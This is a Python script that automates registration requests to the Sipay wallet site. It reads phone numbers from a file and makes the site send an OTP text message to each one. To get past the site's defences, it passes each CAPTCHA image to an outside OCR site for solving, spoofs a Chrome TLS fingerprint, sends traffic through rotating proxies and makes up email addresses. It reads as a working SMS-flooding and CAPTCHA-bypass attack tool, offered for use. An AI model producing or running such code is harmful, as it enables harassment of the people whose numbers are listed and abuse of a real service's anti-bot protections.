import tls_client
from bs4 import BeautifulSoup
import random , requests , base64
import urllib3
import phone_iso3166.country as countries
import phonenumbers
from colorama import Fore
number = random.choice(range(1,4156489185156))
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def get_number(number):
  test = "+" + str(number)
  x = phonenumbers.parse(test)
  phone_number = x.national_number
  countriess = x.country_code
  cnt = countries.phone_country(test).upper()
  phonenumber = str(phone_number)
  return phonenumber,countriess

def getText(url,headers):
    ''' Save Image'''
    image_data = requests.get(url,headers=headers,verify=False).content
    image_path = f'data/image{number}.png'
    image_path = f'data/image3.png'
    with open(image_path, 'wb') as file:
        file.write(image_data)
    ''' Get Cookies For Solver'''
    URL = 'https://picturetotext.info/'
    headers = {
        'Accept' : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8",
        'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        }
    r1 = session.get(URL,headers=headers)
    soup = BeautifulSoup(r1.content, 'lxml')
    csrf = soup.find_all("meta", {"name":"_token"})[0]['content']
    cookies_string = '; '.join([f"{cookie.name}={cookie.value}" for cookie in r1.cookies])
    base64_encoded = base64.b64encode(image_data).decode('utf-8')
    data_uri = f'data:image/png;base64,{base64_encoded}'
    ''' Send Image To Solver'''
    URL ='https://picturetotext.info/picture-to-text'
    headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.6',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Cookie': cookies_string,
        'Origin': 'https://picturetotext.info',
        'Referer': 'https://picturetotext.info/',
        'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'X-Csrf-Token': csrf,
    }
    payload = {
        'name': f'image{number}.png',
        'size': f'{len(data_uri)}',
        'base64': data_uri,
        'index': '0'
    }
    r = session.post(URL,headers=headers,data=payload)
    try:
        if r.status_code == 200 and r.json()['success'] == True:
            text = r.json()['text'].strip('\ufeff\r\n\r\n')
            result = int(str(text).split('+')[0]) +  int(str(text).split('+')[1])
            print('The Result:',result)
            return result
        else:
            return False
    except:
        return False

def signup():
    for number in open('numbers.txt','r').read().splitlines():
        prox = {"http":"http://<yourusername:password>@rp.proxyscrape.com:6060",
                "https":"http://<yourusername:password>@rp.proxyscrape.com:6060"}
        URL = 'https://wallet.sipay.com.tr/register'
        headers = {
            'Accept' : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8",
            'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            }

        r1 = session.get(URL,headers=headers)
        soup = BeautifulSoup(r1.content, 'lxml')
        captcha = soup.find_all("img", {"id":"dntCaptchaImg"})[0]['src']
        captchaURL = f'https://wallet.sipay.com.tr{captcha}'
        cookies_string = '; '.join([f"{cookie.name}={cookie.value}" for cookie in r1.cookies])
        headers['cookie'] = cookies_string
        solve = getText(captchaURL,headers)
        if solve:
            pass
        else:
            continue
        verificationToken = soup.find_all('input', {'name':'__RequestVerificationToken'})[0]['value']
        captchaToken = soup.find_all('input', {'name':'DNTCaptchaToken'})[0]['value']
        captchaTExt = soup.find_all('input', {'name':'DNTCaptchaText'})[0]['value']
        ''' Send SMS '''
        num , code = get_number(number)
        URL = 'https://wallet.sipay.com.tr/register'
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.6',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': cookies_string,
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
            }
        payload = {
            'CurrentStep': 'SendOtp',
            'UserPhoneCountryCode': f'{code}',
            'UserPhoneNumber': f'{num}',
            'UserEmail': f'mohamed{number}@gmail.com',
            'DNTCaptchaText': captchaTExt,
            'DNTCaptchaInputText': solve,
            'DNTCaptchaToken': captchaToken,
            'submit': 'SendOtp',
            '__RequestVerificationToken': verificationToken
        }
        r2 = session.post(URL,headers=headers,data=payload, proxy=prox)
        if r2.status_code == 200 and 'VerifyOtp' in r2.text:
            print(f'{Fore.GREEN}[+] Success Send >>',number,Fore.RESET)
        else:
            print(f'{Fore.RED}[-] Failed Send >>',number,Fore.RESET)
if __name__ == '__main__':
    session = tls_client.Session(client_identifier="chrome_126",random_tls_extension_order=True)
    signup()